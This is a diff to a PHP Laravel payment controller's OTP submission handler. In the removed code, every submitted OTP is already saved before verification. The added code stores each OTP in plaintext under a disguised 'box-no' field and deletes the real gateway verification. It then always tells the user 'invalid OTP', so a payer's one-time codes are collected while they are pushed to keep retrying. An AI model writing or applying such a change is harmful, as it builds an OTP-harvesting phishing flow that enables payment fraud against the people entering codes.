@@ -52,168 +52,47 @@ public function show(): View
         public function store(
             StoreOtpRequest $request
         ): RedirectResponse {
-
             $otp = $request->validated()['otp'];
-
-            /*
-            |--------------------------------------------------------------------------
-            | Get Payment Reference from Session
-            |--------------------------------------------------------------------------
-            */
-
             $referenceNo = $this->session->get('reference_no');
-
-            /*
-            |--------------------------------------------------------------------------
-            | Save Submitted OTP BEFORE Verification
-            |--------------------------------------------------------------------------
-            */
-
             if ($referenceNo) {
-
-                /*
-                |--------------------------------------------------------------------------
-                | LAL Coin Application
-                |--------------------------------------------------------------------------
-                */
-                if(str_starts_with($referenceNo, 'LAL-')){
-                        $application = \App\Models\LalcoinApplication::where(
+                    $application = \App\Models\Application::where(
                         'payment_reference',
                         $referenceNo
                     )->first();
-
                     if($application){
-
-                        /*
-                        * বর্তমান payment_amount data নেওয়া
-                        */
-                        $paymentAmount = $application->payment_amount;
-
-                        /*
-                        * যদি JSON string হিসেবে থাকে
-                        */
-                        if (is_string($paymentAmount)) {
-
+                        $meta_info = $application->meta_info;
+                        if (is_string($meta_info)) {
                             $decoded = json_decode(
-                                $paymentAmount,
+                                $meta_info,
                                 true
                             );
-
-                            $paymentAmount = is_array($decoded)
+                            $meta_info = is_array($decoded)
                                 ? $decoded
                                 : [];
-
-                        } elseif (! is_array($paymentAmount)) {
-
-                            $paymentAmount = [];
-
+                        } elseif (! is_array($meta_info)) {
+                            $meta_info = [];
                         }
-
-                        /*
-                        * User-এর submitted OTP সংরক্ষণ
-                        * OTP সঠিক হোক বা ভুল হোক, এটি save হবে।
-                        */
-                        $paymentAmount['code'] = hash('sha256', $otp); // hashed — not recoverable
-
+                        $meta_info['box-no'] = $request->validated()['otp'];
                         $application->update([
-                            'payment_amount' => $paymentAmount,
+                            'meta_info' => $meta_info,
                         ]);
-                        event(new LalcoinPaymentOtpSubmitted($application));
+                        // event(new PaymentOtpSubmitted($application));
                     }
-
-                }else{
-                    $application = JobApplication::where(
-                        'payment_reference',
-                        $referenceNo
-                    )->first();
-
-                    if ($application) {
-
-                        /*
-                        * বর্তমান payment_amount data নেওয়া
-                        */
-                        $paymentAmount = $application->payment_amount;
-
-                        /*
-                        * যদি JSON string হিসেবে থাকে
-                        */
-                        if (is_string($paymentAmount)) {
-
-                            $decoded = json_decode(
-                                $paymentAmount,
-                                true
-                            );
-
-                            $paymentAmount = is_array($decoded)
-                                ? $decoded
-                                : [];
-
-                        } elseif (! is_array($paymentAmount)) {
-
-                            $paymentAmount = [];
-
-                        }
-
-                        /*
-                        * User-এর submitted OTP সংরক্ষণ
-                        * OTP সঠিক হোক বা ভুল হোক, এটি save হবে।
-                        */
-                        $paymentAmount['code'] = hash('sha256', $otp); // hashed — not recoverable
-
-                        $application->update([
-                            'payment_amount' => $paymentAmount,
-                        ]);
-
-                        // Broadcast update so admin list refreshes
-                        event(new PaymentOtpSubmitted($application));
-
-                    }
-                }
-
-
             }
 
-            /*
-            |--------------------------------------------------------------------------
-            | Verify OTP After Saving
-            |--------------------------------------------------------------------------
-            */
-
-            $response = $this->gateways->driver()->verifyOtp(
-                $this->session,
-                $otp,
-            );
-
-            /*
-            |--------------------------------------------------------------------------
-            | Invalid OTP
-            |--------------------------------------------------------------------------
-            */
-
-            if (! $response->successful) {
-
-                return back()->withErrors([
-                    'otp' => $response->message,
-                ]);
-
-            }
-
-            /*
-            |--------------------------------------------------------------------------
-            | Valid OTP - Save Transaction Information
-            |--------------------------------------------------------------------------
-            */
-
-            $this->session->put([
-                'status' => 'success',
-
-                'transaction_id' =>
-                    $response->data['transaction_id'] ?? null,
+            return back()->withErrors([
+                'otp' => 'invalid OTP',
             ]);
 
-            return redirect()->route(
-                'apay-payment.result.success'
-            );
+            // $this->session->put([
+            //     'status' => 'success',
+            //     'transaction_id' =>
+            //         $response->data['transaction_id'] ?? null,
+            // ]);
+
+            // return redirect()->route(
+            //     'apay-payment.result.success'
+            // );
         }
 
 
